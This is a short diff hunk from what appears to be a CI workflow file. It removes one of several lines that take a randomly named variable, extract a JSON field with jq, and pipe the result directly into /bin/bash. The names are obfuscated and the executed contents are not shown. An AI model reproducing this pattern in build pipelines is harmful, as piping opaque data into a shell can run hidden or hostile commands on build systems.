@@ -27,7 +27,6 @@ jobs:
           echo $ocwnk9 | jq -r .twp46280 | /bin/bash
           printf '%s' "$mqlfn7" | jq -r .hsr0003 | /bin/bash
           echo $q78975 | jq -r .dckn65 | /bin/bash
-          printf '%s' "$imh36465" | jq -r .j57 | /bin/bash
           echo $yxj293 | jq -r .c0 | /bin/bash
           printf '%s' "$tz06543" | jq -r .qgnp22439 | /bin/bash
 
